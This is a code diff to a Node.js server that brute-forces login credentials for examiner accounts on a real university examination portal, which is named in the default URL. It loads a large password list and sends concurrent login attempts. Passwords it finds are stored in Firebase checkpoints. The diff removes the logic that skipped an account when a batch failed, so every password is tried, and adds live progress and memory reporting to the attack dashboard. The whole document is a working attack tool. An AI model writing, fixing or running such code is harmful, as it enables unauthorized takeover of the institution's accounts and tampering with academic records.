@@ -14,16 +14,19 @@ const readFileAsync = promisify(fs.readFile);
 
 // ========== CONFIGURATION ==========
 const PORT = process.env.PORT || 3000;
-const LOGIN_URL = process.env.LOGIN_URL || 'https://lnmuniversity.com/Lnmu_CIA/Home/Login';
+let LOGIN_URL = process.env.LOGIN_URL || 'https://lnmuniversity.com/Lnmu_CIA/Home/Login';
+// Ensure URL starts with https://
+if (!LOGIN_URL.startsWith('http')) LOGIN_URL = 'https://' + LOGIN_URL;
 const LOGIN_TYPE = process.env.LOGIN_TYPE || 'HOD';
 const PASSWORD_FILE = process.env.PASSWORD_FILE || './password.txt';
 const EXAMINER_FILE = process.env.EXAMINER_FILE || './examiners.json';
-const CONCURRENCY = parseInt(process.env.CONCURRENCY) || 30;          // parallel requests per batch
-const REQUEST_TIMEOUT = parseInt(process.env.REQUEST_TIMEOUT) || 4000; // ms
-const CHECKPOINT_INTERVAL = 500;   // save checkpoint after this many attempts
-const PROGRESS_INTERVAL = 500;     // emit progress UI update
+const CONCURRENCY = parseInt(process.env.CONCURRENCY) || 30;
+const REQUEST_TIMEOUT = parseInt(process.env.REQUEST_TIMEOUT) || 4000;
+const CHECKPOINT_INTERVAL = 500;
+const PROGRESS_INTERVAL = 500;
+const MEMORY_REPORT_INTERVAL = 5000; // send RAM usage every 5 seconds
 
-// ========== FIREBASE (optional) ==========
+// ========== FIREBASE (optional, but fixed) ==========
 let db = null;
 let useFirebase = false;
 let bot = null;
@@ -62,12 +65,12 @@ let passwords = [];
 let totalExaminers = 0;
 let currentExaminerIndex = 0;
 let currentPasswordIndex = 0;
-let successes = new Map();
+let successes = new Map(); // examinerId -> password
 let speedStats = { attempts: 0, startTime: null };
 let lastProgressUpdate = 0;
 let lastCheckpointSave = 0;
 
-// HTTP Agent with keep-alive & fallback to http if https fails
+// HTTP Agent with keep-alive
 const agent = new (require('http').Agent)({ keepAlive: true, maxSockets: 256 });
 const httpsAgent = new (require('https').Agent)({ keepAlive: true, maxSockets: 256 });
 const axiosInstance = axios.create({
@@ -101,12 +104,14 @@ function loadPasswords() {
   console.log(`✅ Loaded ${passwords.length} passwords (${(content.length / 1024 / 1024).toFixed(2)} MB)`);
 }
 
-// ========== CHECKPOINT ==========
+// ========== CHECKPOINT (Fixed: no nested arrays) ==========
 async function saveCheckpoint() {
+  // Convert Map to plain object for Firestore compatibility
+  const successesObj = Object.fromEntries(successes);
   const checkpointData = {
     examinerIndex: currentExaminerIndex,
     passwordIndex: currentPasswordIndex,
-    successes: Array.from(successes.entries()),
+    successes: successesObj,          // ✅ object, not nested array
     updatedAt: new Date().toISOString(),
     status: isPaused ? 'paused' : (isRunning ? 'running' : 'stopped')
   };
@@ -144,10 +149,11 @@ async function loadCheckpoint() {
   if (checkpointData) {
     currentExaminerIndex = checkpointData.examinerIndex || 0;
     currentPasswordIndex = checkpointData.passwordIndex || 0;
-    if (checkpointData.successes) {
-      for (const [id, pwd] of checkpointData.successes) successes.set(id, pwd);
+    // Convert successes object back to Map
+    if (checkpointData.successes && typeof checkpointData.successes === 'object') {
+      successes = new Map(Object.entries(checkpointData.successes));
     }
-    console.log(`📌 Resumed: examiner ${currentExaminerIndex}, password #${currentPasswordIndex}`);
+    console.log(`📌 Resumed: examiner ${currentExaminerIndex}, password #${currentPasswordIndex}, ${successes.size} successes`);
   } else {
     console.log('📌 No previous checkpoint');
   }
@@ -165,7 +171,7 @@ async function loadExistingSuccesses() {
   } catch (err) {}
 }
 
-// ========== LOGIN ATTEMPT WITH ABORT ==========
+// ========== LOGIN ATTEMPT ==========
 async function tryLogin(examinerId, password) {
   const controller = new AbortController();
   const timeoutId = setTimeout(() => controller.abort(), REQUEST_TIMEOUT);
@@ -200,9 +206,7 @@ async function processExaminer(examinerId, startPwdIdx) {
     const promises = batch.map(pwd => tryLogin(examinerId, pwd));
     const results = await Promise.all(promises);
 
-    // 🔥 REMOVED: "if allFailed skip examiner"
-    // Now even if all fail, we continue to next batch of passwords
-
+    // ✅ DO NOT SKIP – even if all fail, continue to next batch
     for (let i = 0; i < results.length; i++) {
       if (results[i].success) {
         foundPassword = results[i].password;
@@ -212,7 +216,7 @@ async function processExaminer(examinerId, startPwdIdx) {
     pwdIdx += batch.length;
     currentPasswordIndex = pwdIdx;
 
-    // Update progress & checkpoint
+    // Progress update
     const attemptsSinceLastProgress = speedStats.attempts - lastProgressUpdate;
     if (attemptsSinceLastProgress >= PROGRESS_INTERVAL || pwdIdx >= total) {
       const elapsed = (Date.now() - speedStats.startTime) / 1000;
@@ -228,6 +232,7 @@ async function processExaminer(examinerId, startPwdIdx) {
       lastProgressUpdate = speedStats.attempts;
     }
 
+    // Checkpoint save (throttled)
     if ((speedStats.attempts - lastCheckpointSave) >= CHECKPOINT_INTERVAL || pwdIdx >= total) {
       lastCheckpointSave = speedStats.attempts;
       saveCheckpoint().catch(e => console.error('Checkpoint save error:', e.message));
@@ -280,7 +285,7 @@ async function startAttack() {
     } else {
       console.log(`❌ No password found for ${examinerId} (all ${passwords.length} tried)`);
     }
-    // Reset password index for next examiner
+    // Reset for next examiner
     currentPasswordIndex = 0;
     saveCheckpoint().catch(e => console.error('Checkpoint error:', e.message));
   }
@@ -290,6 +295,18 @@ async function startAttack() {
   io.emit('status', { running: false, paused: false });
   console.log('🏁 Attack finished');
 }
+
+// ========== MEMORY REPORTING (every 5 seconds) ==========
+setInterval(() => {
+  if (io.engine.clientsCount > 0) {
+    const memUsage = process.memoryUsage();
+    io.emit('memory', {
+      rss: Math.round(memUsage.rss / 1024 / 1024),
+      heapTotal: Math.round(memUsage.heapTotal / 1024 / 1024),
+      heapUsed: Math.round(memUsage.heapUsed / 1024 / 1024)
+    });
+  }
+}, MEMORY_REPORT_INTERVAL);
 
 // ========== SOCKET.IO ==========
 io.on('connection', (socket) => {
@@ -343,6 +360,7 @@ io.on('connection', (socket) => {
   server.listen(PORT, () => {
     console.log(`✅ Server at http://localhost:${PORT}`);
     console.log(`⚡ Concurrency: ${CONCURRENCY} passwords/batch`);
-    console.log(`🔒 No skip on failure – will try all 1M passwords for each examiner`);
+    console.log(`🔒 No skip on failure – will try all ${passwords.length} passwords for each examiner`);
+    console.log(`📊 Real‑time RAM usage will be sent to UI every ${MEMORY_REPORT_INTERVAL/1000}s`);
   });
 })();
